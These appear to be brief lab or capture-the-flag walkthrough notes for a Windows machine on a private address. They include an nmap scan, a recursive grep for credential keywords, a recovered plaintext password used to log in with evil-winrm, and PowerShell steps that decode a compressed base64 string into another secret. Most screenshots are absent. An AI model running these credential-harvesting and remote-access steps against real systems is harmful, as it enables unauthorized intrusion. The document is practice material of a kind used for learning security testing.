└─$ sudo nmap -Pn -n 192.168.145.152 -p- -sC -sV --min-rate=5000 -oX compromised.xml

![[wt image 169.png]]

![[wt image 170.png]]

![[wt image 171.png]]

└─$ grep -rinE '(password|username|user|pass|key|token|secret|admin|login|credentials)' | more

![[wt image 172.png]]

![[wt image 173.png]]

FriendsDontLetFriendsBase64Passwords

└─$ evil-winrm -i 192.168.145.152 -u 'scripting' -p 'FriendsDontLetFriendsBase64Passwords'

![[wt image 174.png]]

![[wt image 175.png]]

*Evil-WinRM* PS C:\Troubleshooting> cat logs.ps1

Get-EventLog -LogName 'Windows Powershell' | Export-CSV C:\Troubleshooting\powershell-logs.csv

![[wt image 176.png]]

![[wt image 177.png]]

*Evil-WinRM* PS C:\Troubleshooting> $Decoded = \[System.Convert\]::FromBase64String("H4sIAAAAAAAEAAvJSA3OSM3J8Sz2zUzPKMlMLQrJSMwLAYqW5xelKAIA07xkHB8AAAA=")

*Evil-WinRM* PS C:\Troubleshooting> $ms = (New-Object System.IO.MemoryStream($Decoded,0,$Decoded.Length))

*Evil-WinRM* PS C:\Troubleshooting> (New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, \[System.IO.Compression.CompressionMode\]::Decompress))).readtoend()

==🟢TheShellIsMightierThanTheSword!==

![[wt image 178.png]]

![[wt image 179.png]]